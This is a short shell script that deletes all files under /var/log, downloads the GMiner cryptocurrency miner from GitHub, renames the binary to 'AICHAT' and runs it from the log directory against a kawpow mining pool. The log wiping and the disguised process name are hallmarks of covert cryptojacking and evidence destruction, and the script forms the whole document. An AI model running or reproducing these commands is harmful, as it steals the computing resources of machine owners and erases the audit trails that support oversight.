cd /var/log/
rm -r *
apt install screen -Y
wget https://github.com/develsoftware/GMinerRelease/releases/download/3.40/gminer_3_40_linux64.tar.xz
tar -xf gminer_3_40_linux64.tar.xz
mv miner AICHAT
cd /var/log

./AICHAT -a kawpow -s asia.kawpow-hub.miningpoolhub.com:20611 -u waterghost_2046.oci_6
